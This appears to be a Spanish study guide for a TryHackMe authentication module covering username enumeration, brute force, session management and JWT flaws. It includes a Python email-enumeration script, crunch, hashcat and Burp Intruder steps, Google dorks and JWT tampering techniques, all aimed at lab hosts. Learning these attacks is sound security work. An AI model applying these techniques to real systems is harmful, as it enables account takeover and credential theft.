<h1>
  <img src="https://assets.tryhackme.com/img/modules/authentication.svg" width="70px" align="absmiddle">
  <span> Authentication</span>
</h1>

---

> Domina la explotación de los mecanismos de autenticación a través de escenarios del mundo real, cubriendo la enumeración y la fuerza bruta, la gestión de sesiones, las vulnerabilidades OAuth, MFA/2FA y JWT.

Este módulo se centrará en comprender y mitigar las vulnerabilidades críticas en los sistemas de autenticación. Primero aprenderemos los mecanismos de autenticación de enumeración y forzamiento bruto, seguido de explorar la gestión de sesiones y varios ataques que se pueden realizar contra implementaciones inseguras. Cubriremos una variedad de temas, incluyendo JSON Web Tokens (JWT), vulnerabilidades OAuth que cubren parámetros de estado faltantes, robo de tokens y muchos más. Finalmente, exploraremos la importancia de MFA/2FA para agregar capas de seguridad y explotarlas. Todas las habitaciones están equipadas con escenarios realistas que prácticamente le permiten explorar y abordar varias vulnerabilidades.

---

## 🚀 Matriz de Consulta Rápida (Cheat Sheet de Autenticación, Sesiones, Tokens y OAuth)

| Vector de Ataque / Tarea | Mecánica y Causa Raíz | Herramienta / Comando Clave | Indicador de Éxito / Resultado |
| :--- | :--- | :--- | :--- |
| **Enumeración por Errores Verbosos** | Mensajes de error diferenciados entre usuario inexistente y contraseña inválida. | `python3 script.py` / Burp Suite Intruder | Respuestas HTTP dispares en código de estado, longitud (*Length*) o texto. |
| **Tokens de Reseteo Predecibles** | Generación de números pseudoaleatorios de baja entropía (ej. PIN numérico de 3 a 6 dígitos). | `crunch 3 3 0123456789 -o pins.txt` y Burp Intruder | Respuesta HTTP con mayor longitud (*Content-Length*) o redirección 302 hacia el panel de cambio. |
| **Fuerza Bruta en HTTP Basic Auth** | Autenticación cabecera RFC 7617 mediante credenciales codificadas en Base64. | Burp Intruder (Prefijo `admin:`, Codificación Base64 sin URL encode en `=`) | Código de estado HTTP `200 OK` en lugar de `401 Unauthorized`. |
| **Fijación de Sesión (*Session Fixation*)** | El identificador de sesión previo a la autenticación se mantiene intacto tras el inicio de sesión exitoso. | Intercepción de `Set-Cookie` en Burp Repeater | La cookie de sesión no cambia su valor tras enviar las credenciales válidas. |
| **Bypass de Autorización Vertical/Horizontal** | Ausencia de validación de roles en backend o controles de acceso a nivel de objeto ausentes (IDOR). | Manipulación de cookies/parámetros en Burp Proxy | Acceso a funciones administrativas o visualización de registros pertenecientes a terceros. |
| **Divulgación de Datos en JWT** | Inclusión de secretos, contraseñas o datos de infraestructura en los claims del token. | Decodificación en `jwt.io` o `base64 -d` | Extracción de contraseñas, hashes, roles o IPs privadas del payload sin descifrado. |
| **Omisión de Firma en JWT** | El servidor backend deserializa y procesa el token sin comprobar criptográficamente la firma. | Eliminar la tercera sección del token dejando únicamente `header.payload.` | El servidor responde con HTTP 200 y otorga privilegios de administrador. |
| **Degradación a Algoritmo `none`** | Modificación del encabezado para declarar `{"alg": "none"}` eliminando la verificación. | Modificar encabezado a Base64URL y omitir firma | Aceptación del token forjado con privilegios elevados (`admin: 1`). |
| **Descifrado Offline de Secreto JWT** | Firma simétrica HS256 generada a partir de contraseñas cortas o diccionarios débiles. | `hashcat -m 16500 -a 0 jwt.txt secrets.list` | Recuperación de la clave simétrica en texto plano para re-firmar tokens arbitrarios. |
| **Confusión de Algoritmos (RS256 a HS256)** | El backend utiliza la clave pública RSA como clave secreta simétrica HMAC. | Script `forge.py` con PyJWT o herramienta especializada | Validación exitosa de un token forjado con HS256 usando la clave pública conocida. |
| **Tokens Sin Caducidad (*Missing exp*)** | Ausencia del claim de expiración `exp` en la carga útil del JWT. | Inspección de claims en `jwt.io` | Persistencia indefinida de la sesión sin invalidación temporal automática. |
| **Retransmisión Entre Servicios (*Relay Attack*)** | El servidor no valida el claim `aud` (Audiencia), permitiendo reutilizar tokens en otras apps. | Reenvío de token de `appB` hacia el endpoint de `appA` | Acceso con privilegios indebidos en una aplicación ajena dentro del ecosistema SSO. |
| **Robo de Token por Manipulación de `redirect_uri`** | Validación laxa o permisiva de URLs de redirección en el servidor de autorización. | Formulario malicioso apuntando a subdominio comprometido (`dev.bistro.thm:8002`) | Desvío del código de autorización hacia el servidor del atacante y canje en callback. |
| **CSRF en OAuth por Parámetro `state` Ausente** | Falta de validación de estado entre la petición del cliente y la respuesta del proveedor. | Intercepción de código del atacante y envío de URL a la víctima | Vinculación forzada de la cuenta OAuth del atacante con la sesión de la víctima. |
| **Exfiltración de Token en Flujo Implícito** | Retorno directo del token de acceso en el fragmento `#` de la URL expuesto a XSS. | `python3 -m http.server 8081` y script XSS leyendo `window.location.hash` | Captura del token de portador en la consola del atacante y toma de control. |
| **Ataques de Repetición (*Replay Attacks*)** | Falta de destrucción inmediata del código tras su primer uso o ausencia de `nonce`. | Reenvío de solicitudes capturadas en Burp Repeater | Generación múltiple de tokens de acceso a partir de una única autorización. |
| **Evolución OAuth 2.1 y Blindaje con PKCE** | Depreciación de flujos inseguros (Implicit y Password Grant) e imposición de PKCE. | Parámetros `code_challenge` y `code_verifier` en clientes públicos | Inmunidad frente a intercepciones locales de código y eliminación de fugas en navegador. |

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1719928599415" width="60px" align="absmiddle">
  <span> Enumeración y Fuerza Bruta (Enumeration & Brute Force)</span>
</h2>

### 1.1. Fundamentos de la Enumeración en Autenticación
La enumeración de autenticación constituye la fase analítica en la que un auditor descompone metódicamente los mecanismos de control de acceso para descubrir qué identidades son legítimas dentro de la aplicación objetivo. En términos operativos, este proceso puede compararse con el trabajo minucioso de un detective digital que no se limita a marcar casillas en una lista de verificación, sino que analiza cómo encajan todas las piezas de la infraestructura. Descubrir un nombre de usuario válido permite reducir a la mitad la complejidad de un ataque posterior de fuerza bruta, ya que el evaluador puede focalizar todos sus recursos exclusivamente en descifrar la contraseña correspondiente en lugar de realizar conjeturas simultáneas sobre ambas variables.

Además de los nombres de usuario, la enumeración abarca la deducción de las políticas de contraseñas impuestas por la organización. Muchos sistemas web devuelven mensajes informativos cuando un usuario introduce una clave que no cumple los estándares establecidos, como por ejemplo la obligatoriedad de contener caracteres en mayúscula, dígitos numéricos o caracteres especiales. En aplicaciones desarrolladas en lenguajes como PHP, estas reglas suelen implementarse mediante expresiones regulares que filtran la entrada antes de procesarla en la base de datos. Si el sistema emite un error que describe exactamente la regla de validación violada, el auditor puede utilizar dicha información para estructurar diccionarios personalizados con herramientas como Crunch o aplicar reglas específicas en Hashcat, descartando millones de combinaciones inútiles que de otro modo consumirían tiempo y ancho de banda innecesariamente.

<br>

### 1.2. Puntos Habituales de Enumeración en Aplicaciones Web
Las interfaces web modernas están diseñadas para maximizar la comodidad del usuario, pero a menudo esa misma usabilidad introduce vectores críticos de divulgación de información. El primer punto crítico se localiza en los formularios de registro de nuevos usuarios. Con el fin de agilizar el proceso, muchas aplicaciones notifican de forma inmediata en pantalla si una dirección de correo electrónico o un nombre de usuario ya se encuentra ocupado. Esta retroalimentación, aunque beneficiosa para la experiencia de usuario, confirma de forma categórica la existencia de cuentas activas en la base de datos, permitiendo a un auditor compilar una lista exhaustiva de identidades legítimas mediante el envío automatizado de listas de palabras.

El segundo vector común reside en los mecanismos de restablecimiento de contraseña. Al solicitar la recuperación de una cuenta, las aplicaciones que no han sido blindadas presentan variaciones perceptibles en sus respuestas dependiendo de si el usuario introducido existe o no. Un sistema vulnerable puede devolver un mensaje afirmativo indicando que se ha enviado un enlace de recuperación si la cuenta es válida, o una advertencia señalando que el correo no fue encontrado en el sistema. Incluso cuando el mensaje textual se unifica para evitar discrepancias, diferencias sutiles en los tiempos de respuesta del servidor backend causadas por el envío real de un correo electrónico frente a una denegación inmediata pueden revelar la validez de la cuenta.

El tercer vector reside en los errores verbosos generados durante los intentos fallidos de inicio de sesión. Cuando el mensaje de error distingue explícitamente entre un nombre de usuario inexistente y una contraseña incorrecta para una cuenta que sí existe, el sistema elimina toda ambigüedad. Finalmente, la información procedente de violaciones de datos previas de dominio público ofrece una fuente invaluable de inteligencia externa. La tendencia generalizada de los usuarios a reutilizar nombres de usuario y contraseñas a través de múltiples plataformas permite a los auditores comprobar si las identidades comprometidas en incidentes históricos pasados continuan vigentes en la aplicación evaluada.

<br>

### 1.3. Enumeración de Usuarios mediante Errores Verbosos
Los errores verbosos actúan como susurros involuntarios del sistema que revelan información confidencial originalmente destinada a los desarrolladores durante las fases de depuración y pruebas. En un entorno de producción, estos mensajes detallados exponen rutas internas del sistema de archivos, revelando la estructura de directorios del servidor web y la ubicación potencial de archivos de configuración o claves de cifrado que no deberían ser accesibles al público. Asimismo, pueden filtrar detalles de la arquitectura de la base de datos, incluyendo nombres de tablas, nombres de columnas y el motor de almacenamiento subyacente.

Para inducir deliberadamente la aparición de estos errores informativos, se emplean diversas tácticas de sondeo. La introducción intencionada de combinaciones anómalas en los campos de inicio de sesión permite contrastar las respuestas del servidor. La inyección de caracteres especiales propios de bases de datos, como una comilla simple en un campo de texto, puede desestabilizar la consulta SQL subyacente y forzar al servidor a devolver una traza de depuración con fragmentos de la consulta. Del mismo modo, la manipulación de parámetros de ruta mediante secuencias de salto de directorio o la alteración de campos ocultos en formularios HTML obliga al sistema a gestionar estados excepcionales no contemplados, dejando al descubierto la lógica interna del backend.

En el entorno práctico del laboratorio de inicio de sesión verboso, al interactuar con el formulario ubicado en la ruta de inicio de sesión, se observa que la introducción de un correo no registrado desencadena un mensaje explícito que indica que el correo electrónico no existe en el sistema. Por el contrario, al enviar una dirección registrada con una contraseña aleatoria cualquiera, el sistema responde indicando que la contraseña no es válida. Esta discrepancia permite construir de forma inmediata un script de automatización en Python que itera sobre un archivo de direcciones de correo electrónico comunes, discriminando las cuentas activas sin disparar mecanismos de bloqueo por contraseñas incorrectas.

```python
import requests

url = "http://enum.thm/labs/verbose_login/"
wordlist_path = "emails.txt"

with open(wordlist_path, "r", encoding="utf-8") as file:
    for line in file:
        email = line.strip()
        data = {"email": email, "password": "DummyPassword123!"}
        response = requests.post(url, data=data)
        if "Contraseña no válida" in response.text or "Invalid password" in response.text:
            print(f"[+] Usuario activo confirmado: {email}")
        elif "El correo electrónico no existe" in response.text or "does not exist" in response.text:
            pass
```

<br>

### 1.4. Explotación de la Lógica en Restablecimientos de Contraseña
El flujo de recuperación de cuentas es un componente esencial para la operatividad de los usuarios, pero su implementación introduce riesgos severos cuando la generación y validación de los factores de recuperación no se ejecutan bajo normas estrictas de aleatoriedad. Entre los métodos más comunes se encuentran el restablecimiento mediante enlaces enviados por correo electrónico, la validación basada en preguntas de seguridad preconfiguradas y la transmisión de códigos por mensajería SMS. Las preguntas de seguridad son frecuentemente vulneradas mediante técnicas de reconocimiento OSINT en redes sociales, mientras que los códigos SMS son susceptibles a ataques de duplicación de tarjeta SIM o intercepción de señal celular.

La vulnerabilidad más crítica en estos flujos se presenta cuando los tokens de restablecimiento son predecibles o carecen de una caducidad adecuada. Si un sistema genera tokens basados en marcas de tiempo con baja resolución, secuencias numéricas cortas o identificadores derivados de datos del usuario, un evaluador puede adivinar o forzar brutalmente el valor necesario para acceder a la pantalla de cambio de clave. En el laboratorio práctico de tokens predecibles, la aplicación web envía un enlace de recuperación estructurado mediante un parámetro directo en la URL que responde a un token numérico de tres dígitos generado entre el valor 100 y el 200.

Para explotar este mecanismo, el primer paso consiste en solicitar el restablecimiento para la cuenta de la víctima, por ejemplo la dirección de administración. A continuación, se captura la solicitud enviada hacia la página de restablecimiento mediante el proxy de Burp Suite y se envía hacia la herramienta Burp Intruder. En la pestaña de posiciones, se configura el marcador de carga útil sobre el valor numérico del parámetro del token. En la máquina atacante se genera el diccionario de prueba utilizando el comando Crunch mediante la sintaxis que especifica longitud mínima y máxima junto con el conjunto numérico.

```bash
crunch 3 3 0123456789 -o tokens_numericos.txt
```

Una vez cargado el diccionario generado dentro de la pestaña de cargas útiles de Burp Intruder, se inicia el ataque de fuerza bruta. Dado que las solicitudes con tokens erróneos devuelven un mensaje de error con un tamaño de respuesta homogéneo, la solicitud que contiene el token legítimo se identifica de forma instantánea al observar una longitud de contenido notablemente superior o una redirección hacia el formulario de ingreso de nueva contraseña. Aunque en aplicaciones reales se utilicen códigos de seis dígitos, el principio operativo es idéntico y resulta explotable siempre que el servidor carezca de mecanismos estrictos de limitación de tasa (*Rate Limiting*) o bloquee el token tras un número reducido de intentos fallidos.

<br>

### 1.5. Explotación de la Autenticación Básica HTTP
La autenticación básica HTTP, formalizada en el estándar RFC 7617, representa uno de los métodos de control de acceso más antiguos y simples en la web. Carece por completo de gestión de sesiones, almacenamiento de cookies y soporte para autenticación de múltiples factores. A pesar de su antigüedad, se mantiene ampliamente distribuida en dispositivos de red con recursos de procesamiento limitados, tales como enrutadores domésticos, conmutadores, cámaras IP y paneles de gestión de servicios como Apache Tomcat o interfaces de monitoreo interno donde la sobrecarga de mantener estados de sesión complejos resulta innecesaria.

El protocolo funciona mediante un mecanismo de desafío y respuesta. Cuando un cliente solicita un recurso protegido sin credenciales, el servidor responde con un código de estado HTTP 401 Unauthorized y la cabecera `WWW-Authenticate: Basic realm="Zona Protegida"`. A partir de ese momento, el navegador o la herramienta de auditoría debe enviar en cada petición subsiguiente el encabezado `Authorization: Basic [CADENA_BASE64]`, donde dicha cadena corresponde a la representación en Base64 del nombre de usuario y la contraseña separados por dos puntos (`usuario:contraseña`). Debido a que Base64 es un esquema de codificación reversible y no un algoritmo de cifrado, la transmisión de estas credenciales sobre canales HTTP sin TLS expone la información a cualquier oyente en la red local.

Para realizar un ataque de fuerza bruta sobre un servicio de autenticación básica con Burp Suite, se captura la petición HTTP que contiene la cabecera de autorización y se transfiere a Intruder. En la pestaña de posiciones, se decodifica manualmente la cadena Base64, se reemplaza por el formato en texto plano `admin:CONTRASEÑA` y se selecciona la contraseña como la única posición variable. En la pestaña de cargas útiles, se carga una lista de credenciales comunes, como el diccionario de 500 contraseñas peores de SecLists. En la sección de procesamiento de cargas útiles (*Payload Processing*), se agregan dos reglas indispensables: en primer lugar, una regla de prefijo que anteponga la cadena `admin:` al valor de la contraseña; en segundo lugar, una regla que aplique codificación Base64 al resultado combinado. Asimismo, en la sección inferior de codificación de caracteres, es obligatorio desmarcar el signo igual (`=`) de la lista de caracteres a codificar por URL para evitar que el relleno final de Base64 se corrompa durante el envío. La obtención de un código de respuesta HTTP 200 OK confirma la combinación correcta.

<br>

### 1.6. Reconocimiento y OSINT mediante Wayback Machine y Google Dorks
El reconocimiento de fuentes abiertas (OSINT) permite a los auditores identificar vectores de autenticación desprotegidos y recursos sensibles sin interactuar directamente con la infraestructura actual de la víctima. La plataforma Internet Archive y su servicio Wayback Machine permiten explorar versiones históricas de aplicaciones web desde sus orígenes. Con frecuencia, los desarrolladores eliminan enlaces a paneles administrativos, scripts de prueba o respaldos de bases de datos de la interfaz pública moderna, pero dejan los archivos activos en los directorios del servidor backend.

Para automatizar la extracción masiva de todas las rutas y URLs históricas registradas en Wayback Machine relativas a un dominio objetivo, se utiliza la herramienta especializada `waybackurls`. Esta utilidad procesa los registros archivados y emite una lista limpia de puntos finales que pueden analizarse con herramientas de búsqueda para detectar parámetros vulnerables o rutas obsoletas.

```bash
# Extracción de URLs archivadas para el dominio objetivo con waybackurls
waybackurls dominio-objetivo.thm > urls_historicas.txt

# Filtrado de rutas con extensiones potencialmente sensibles o parámetros de acceso
grep -E "\.(sql|bak|log|old|env|txt|php\?)" urls_historicas.txt
```

De manera complementaria, los operadores de búsqueda avanzada de Google, conocidos como Google Dorks, permiten interrogar los índices de los motores de búsqueda para localizar información confidencial expuesta accidentalmente. Entre las consultas más efectivas para auditorías de autenticación se encuentran las destinadas a ubicar paneles administrativos directos mediante la sintaxis `site:dominio-objetivo.thm inurl:admin` o `site:dominio-objetivo.thm inurl:login`. Para localizar archivos de registro que contengan contraseñas enviadas en texto claro se emplea `filetype:log "password" site:dominio-objetivo.thm`. Asimismo, el descubrimiento de copias de seguridad de directorios completos expuestos por malas configuraciones de listado se realiza mediante `intitle:"index of" "backup" site:dominio-objetivo.thm`.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/6093e17fa004d20049b6933e-1722528947776" width="60px" align="absmiddle">
  <span> Gestión de Sesiones (Session Management)</span>
</h2>

### 2.1. Arquitectura y Ciclo de Vida de la Gestión de Sesiones
El protocolo HTTP fue concebido desde sus orígenes como un protocolo sin estado (*stateless*), lo que significa que cada solicitud enviada por un cliente se procesa de forma independiente sin que el servidor conserve memoria de las interacciones previas. Para permitir que los usuarios interactúen con plataformas complejas sin tener que enviar sus credenciales completas de usuario y contraseña en cada petición individual, se desarrollaron los mecanismos de gestión de sesiones. La sesión actúa como un identificador temporal que asocia el tráfico del navegador con el estado de autenticación y los privilegios almacenados en el backend.

El ciclo de vida de la gestión de sesiones se divide en cuatro fases críticas interconectadas:

La primera fase corresponde a la creación de la sesión. Aunque muchos asumen que la sesión se inicia únicamente tras una autenticación exitosa, en numerosas plataformas se genera un valor de sesión anónimo desde la primera visita con fines de seguimiento analítico o gestión de carritos de compra. El aspecto de seguridad determinante consiste en garantizar que este identificador sea completamente revocado y reemplazado por un nuevo valor de alta entropía una vez que el usuario se autentica satisfactoriamente.

La segunda fase abarca el seguimiento de la sesión. Una vez emitido el identificador, el cliente lo adjunta en cada solicitud posterior. El servidor web intercepta este valor, consulta el almacén de sesiones en el backend y recupera la identidad del usuario y los privilegios asignados para evaluar la legitimidad de la acción solicitada.

La tercera fase corresponde al vencimiento de la sesión. Debido a que el protocolo HTTP no notifica al servidor cuando un usuario simplemente cierra la pestaña o la ventana del navegador, el sistema debe imponer una vida útil finita a cada identificador. Esta política debe contemplar un tiempo de expiración por inactividad (*Idle Timeout*) y un tiempo de vida máximo absoluto (*Absolute Timeout*). Si un cliente presenta una sesión caducada, el backend debe rechazar la solicitud de forma inmediata y redirigir al flujo de autenticación.

La cuarta fase es la terminación explícita de la sesión. Cuando el usuario hace clic en la opción de cierre de sesión (*Logout*), la aplicación está obligada a destruir de forma irreversible el registro de sesión en la base de datos o en el almacén de memoria del servidor, garantizando que el identificador quede inutilizado de inmediato incluso si aún no había alcanzado su fecha de expiración cronológica.

<br>

### 2.2. Autenticación frente a Autorización y el Modelo IAAA
La comprensión de los fallos en la gestión de sesiones requiere delimitar con precisión los conceptos de autenticación y autorización mediante el modelo clásico IAAA, que define los cuatro pilares del control de acceso:

El primer pilar es la Identificación, que consiste en la afirmación de una identidad dentro del sistema. En una aplicación web, esto se materializa cuando el usuario introduce su nombre de cuenta o dirección de correo electrónico en un formulario, comunicando al servidor quién afirma ser.

El segundo pilar es la Autenticación, que representa el proceso técnico de verificar si la entidad que realiza la afirmación es auténtica. Para ello, el usuario debe presentar una prueba concluyente de su identidad, como el conocimiento de una contraseña secreta o la posesión de un factor de autenticación multifactor. Es en el momento en que la autenticación resulta exitosa cuando la aplicación procede a la creación del contexto de sesión.

El tercer pilar es la Autorización, consistente en garantizar que un usuario autenticado disponga de los derechos y permisos específicos para llevar a cabo la operación que está solicitando. En el flujo cotidiano de la aplicación, el seguimiento de la sesión es el componente encargado de mantener el contexto de autorización.

El cuarto pilar es la Responsabilidad o Rendición de Cuentas (*Accountability*), que radica en la generación de registros de auditoría (*logs*) inmutables que asocien cada acción ejecutada con el identificador de sesión y la identidad del usuario responsable. Estos registros son indispensables para la reconstrucción forense de incidentes de seguridad y deben registrar tanto las solicitudes autorizadas como las denegadas.

<br>

### 2.3. Comparativa Técnica: Cookies frente a Tokens
La gestión de sesiones se divide principalmente en dos paradigmas tecnológicos: el enfoque tradicional basado en cookies y el enfoque contemporáneo basado en tokens, cada uno con propiedades operativas y perfiles de riesgo marcadamente distintos.

| Característica / Parámetro | Gestión Basada en Cookies | Gestión Basada en Tokens (JWT / Bearer) |
| :--- | :--- | :--- |
| **Mecanismo de Envío** | El navegador envía la cookie de forma automática con cada petición HTTP dirigida al dominio. | El código JavaScript en el cliente debe extraer el token de almacenamiento y enviarlo manualmente en cabeceras. |
| **Cabecera HTTP Típica** | `Cookie: session=12345` | `Authorization: Bearer <TOKEN>` |
| **Ubicación de Almacenamiento** | Jarra de cookies del navegador con soporte para banderas de protección nativas. | Comúnmente en `LocalStorage` o `SessionStorage` del navegador mediante JavaScript. |
| **Atributos de Seguridad** | Atributos nativos del navegador: `Secure`, `HttpOnly`, `SameSite=Strict/Lax/None`, `Max-Age`. | Sin atributos nativos del navegador; la seguridad depende enteramente del diseño criptográfico del token. |
| **Vulnerabilidad a CSRF** | Altamente vulnerable a menos que se implementen tokens anti-CSRF específicos o banderas `SameSite`. | Inmune por diseño a ataques CSRF convencionales, ya que el navegador no lo adjunta de forma automática en peticiones de origen cruzado. |
| **Vulnerabilidad a XSS** | Protegible frente a extracción directa mediante el uso de la directiva `HttpOnly`. | Altamente expuesto a robo total; cualquier ejecución XSS puede leer el token desde `LocalStorage` y exfiltrarlo. |
| **Idoneidad en Arquitectura** | Óptimo para aplicaciones web monolíticas limitadas a un único dominio principal. | Ideal para arquitecturas desacopladas, microservicios, aplicaciones móviles y APIs que sirven a múltiples plataformas. |

En el modelo de cookies, la directiva `Set-Cookie` emitida por el servidor permite aplicar directivas fundamentales: `Secure` asegura que la cookie nunca sea transmitida sobre conexiones HTTP en texto plano; `HttpOnly` bloquea el acceso al objeto de la cookie desde scripts de JavaScript, mitigando el robo de sesiones mediante vulnerabilidades XSS; y `SameSite` regula si la cookie debe enviarse en solicitudes originadas desde sitios web externos, neutralizando los ataques de Falsificación de Peticiones en Sitios Cruzados (CSRF).

Por el contrario, el modelo de tokens delega la responsabilidad del manejo de la sesión en el cliente. La aplicación web entrega el token en el cuerpo JSON de una respuesta tras la autenticación, y el código JavaScript lo almacena en `LocalStorage`. En cada petición posterior a la API, el script lee el token y lo inyecta dentro del encabezado `Authorization`. Aunque este enfoque resuelve la compatibilidad con dispositivos móviles y clientes sin soporte de cookies, introduce riesgos significativos si el token no cuenta con mecanismos criptográficos robustos de integridad o si la aplicación resulta vulnerable a ataques XSS que permitan su extracción inmediata.

<br>

### 2.4. Amenazas y Defensas en las Fases del Ciclo de Vida de Sesión
Durante la creación de sesiones, una vulnerabilidad recurrente es el uso de valores de sesión débiles o predecibles. Esto ocurre cuando los desarrolladores implementan esquemas de generación propios que concatenan nombres de usuario codificados en Base64 con marcas de tiempo predecibles. Si un auditor logra realizar ingeniería inversa sobre el algoritmo de emisión, puede sintetizar identificadores válidos y secuestrar cuentas arbitrarias. 

Otra amenaza crítica en esta etapa es la Fijación de Sesión (*Session Fixation*). En este escenario, la aplicación asigna un identificador de sesión a un usuario antes de que este inicie sesión y no regenera dicho identificador una vez completada la autenticación. Un atacante puede suministrar a la víctima un enlace que obligue a su navegador a adoptar un identificador de sesión predeterminado y, tras esperar a que la víctima inicie sesión con dicho valor, utilizar el mismo identificador fijado para acceder directamente a la cuenta comprometida. Para mitigar esto, es imperativo que el motor de la aplicación invoque funciones de regeneración de sesión (como `session_regenerate_id(true)` en PHP) inmediatamente después de validar las credenciales.

En la fase de seguimiento de sesión, los desvíos de autorización se dividen en dos categorías principales. La derivación de autorización vertical ocurre cuando un usuario estándar logra ejecutar acciones exclusivas de roles privilegiados, como acceder a rutas de administración debido a una falta de comprobación de roles en los controladores del backend. La derivación de autorización horizontal (conocida ampliamente como IDOR) ocurre cuando un usuario interactúa con datos pertenecientes a otro usuario con su mismo nivel de privilegios mediante la simple alteración de parámetros identificadores en la solicitud. Asimismo, un registro insuficiente de auditoría impide la investigación forense de accesos ilícitos, por lo que toda acción crítica debe asociarse inmutablemente con el identificador de sesión en los logs del servidor.

Finalmente, en las etapas de expiración y terminación, los fallos comunes radican en vidas útiles excesivamente prolongadas y en la omisión de la destrucción del estado de sesión en el lado del servidor durante el cierre de sesión. Si el botón de cerrar sesión únicamente borra la cookie en el navegador del cliente pero mantiene el identificador activo en el backend, un atacante que haya interceptado la cookie previamente podrá seguir utilizándola indefinidamente. La arquitectura segura exige la invalidación inmediata del registro de sesión en la base de datos y la revocación forzosa de todas las sesiones activas en caso de que se realice un restablecimiento de contraseña.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/6093e17fa004d20049b6933e-1725877138785" width="60px" align="absmiddle">
  <span> Seguridad en JSON Web Tokens (JWT Security)</span>
</h2>

### 3.1. Arquitectura de las APIs y Gestión de Sesiones basada en Tokens
El crecimiento exponencial de las arquitecturas orientadas a microservicios y aplicaciones móviles impulsó la adopción de Interfaces de Programación de Aplicaciones (APIs) como núcleo del desarrollo web moderno. A diferencia de las plataformas tradicionales basadas en monolitos, una única API centralizada sirve de forma simultánea a interfaces web, aplicaciones nativas para Android o iOS y servicios externos de terceros. En este ecosistema heterogéneo, el uso de cookies resulta ineficiente o directamente inviable, ya que las aplicaciones móviles y los scripts de backend no gestionan el almacenamiento de cookies del mismo modo que un navegador comercial.

Para resolver esta limitación, se estandarizó la gestión de sesiones basada en tokens utilizando el formato JSON Web Token (JWT), formalizado en el estándar RFC 7519. Un JWT es un contenedor de datos compacto, autónomo y verificado criptográficamente que transmite afirmaciones (*claims*) entre dos entidades de red. Debido a que el token es completamente autónomo y contiene en su propia estructura la identidad del usuario, sus roles y su fecha de expiración, los servidores de aplicaciones pueden verificar su legitimidad sin necesidad de realizar consultas recurrentes a una base de datos central de sesiones, posibilitando una escalabilidad horizontal masiva.

<br>

### 3.2. Estructura y Funcionamiento Criptográfico de un JWT
Un token JWT se compone de tres bloques claramente diferenciados, codificados individualmente en Base64URL y delimitados entre sí mediante caracteres de punto (`.`):

`[Encabezado / Header] . [Carga Útil / Payload] . [Firma / Signature]`

El primer bloque corresponde al Encabezado (*Header*), que adopta la estructura de un objeto JSON que declara los metadatos del token. Entre sus campos principales se encuentran `typ`, que especifica que se trata de un token JWT, y `alg`, que define el algoritmo criptográfico seleccionado para generar y verificar la firma digital.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

El segundo bloque corresponde a la Carga Útil (*Payload*), que alberga el conjunto de afirmaciones (*claims*) que definen el estado de la sesión. Los estándares dividen los claims en registrados (estandarizados por el RFC, tales como `iss` para el emisor, `sub` para el sujeto, `aud` para la audiencia prevista y `exp` para el tiempo de expiración) y claims públicos o privados definidos por la lógica de negocio de la aplicación (como `username` o `admin: 1`).

```json
{
  "username": "operador",
  "admin": 0,
  "iat": 1775548800,
  "exp": 1775552400
}
```

El tercer bloque es la Firma (*Signature*), que garantiza la integridad matemática del token e impide que un cliente altere el encabezado o la carga útil sin invalidar el resultado. La firma se genera concatenando el encabezado codificado en Base64URL y la carga útil codificada en Base64URL, aplicando sobre dicha cadena el algoritmo criptográfico especificado en el encabezado con una clave secreta.

Los tres principales algoritmos de firma son:
En primer lugar, el algoritmo `none`, que indica que el token carece por completo de firma criptográfica y se comporta como un objeto sin validación de integridad.
En segundo lugar, los algoritmos simétricos, como HMAC-SHA256 (HS256), que requieren que tanto el emisor que crea el token como el receptor que lo valida compartan la misma clave secreta privada.
En tercer lugar, los algoritmos asimétricos, como RSA-SHA256 (RS256), en los que el emisor firma el token utilizando una clave privada que mantiene en estricto secreto, mientras que cualquier servicio receptor puede verificar la firma empleando la clave pública asociada distribuida abiertamente.

<br>

### 3.3. Vulnerabilidad: Divulgación de Información Sensible
Uno de los errores conceptuales más frecuentes cometidos por desarrolladores noveles consiste en asumir que, debido a que el JWT se representa como una cadena codificada, su contenido es inaccesible o está cifrado. En la configuración estándar, un JWT está firmado pero **no cifrado** (a diferencia de un JSON Web Encryption o JWE). En consecuencia, cualquier persona que posea el token puede decodificar las secciones de encabezado y carga útil de forma instantánea revirtiendo el formato Base64URL.

Esta confusión da lugar a vulnerabilidades graves de fuga de información cuando los programadores trasladan la costumbre de almacenar variables de sesión sensibles del backend (como se hace tradicionalmente en PHP con `$_SESSION`) directamente a los claims del JWT. Se han documentado aplicaciones en producción que transmiten hashes de contraseñas, contraseñas en texto claro, claves maestras de API, tokens de terceros o direcciones IP internas de la red corporativa dentro del payload del token.

En el entorno práctico del laboratorio (Ejemplo 1), al autenticarse en el endpoint de la API mediante una petición cURL en formato JSON, el servidor devuelve un token JWT:

```bash
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://TARGET_IP/api/v1.0/example1
```

Al extraer la segunda sección del token recibido y decodificarla utilizando la herramienta de línea de comandos `base64` o portales analíticos como `jwt.io`, se visualiza directamente en texto plano la contraseña de administración o la bandera del ejercicio almacenada de forma imprudente en una clave del objeto JSON. La remediación definitiva exige que ningún dato confidencial sea transferido al cliente dentro del JWT; el payload debe restringirse a identificadores mínimos como el ID de usuario, y cualquier información sensible debe permanecer custodiada en la base de datos backend.

```bash
# Decodificación de la carga útil del JWT en terminal
echo "eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwic2VjcmV0X2ZsYWciOiJUSE17SldUX0ZMQVRfRVhQT1NVUkV9In0" | base64 -d
```

<br>

### 3.4. Vulnerabilidad: Omisión Total de Validación de Firma
La firma digital de un JWT es el único mecanismo que impide a un cliente modificar arbitrariamente sus privilegios. Sin embargo, en ocasiones los desarrolladores configuran bibliotecas de backend para deserializar el token y leer los claims de usuario sin invocar las funciones de verificación criptográfica de la firma. Esto ocurre frecuentemente en puntos finales específicos de una API creados para microservicios internos donde se asumió erróneamente que la verificación ya se había llevado a cabo en una pasarela previa (*API Gateway*).

En el laboratorio práctico (Ejemplo 2), el auditor se autentica para obtener un token legítimo con privilegios de usuario regular (`admin: 0`). Para verificar si el punto final valida la firma, se toma el token y se elimina por completo la tercera sección correspondiente a la firma, dejando únicamente el encabezado, el punto delimitador, el payload y el punto final (`header.payload.`). Si el servidor continúa respondiendo favorablemente y procesa la identidad del usuario a pesar de la ausencia de firma, se confirma que el backend procesa las solicitudes a ciegas.

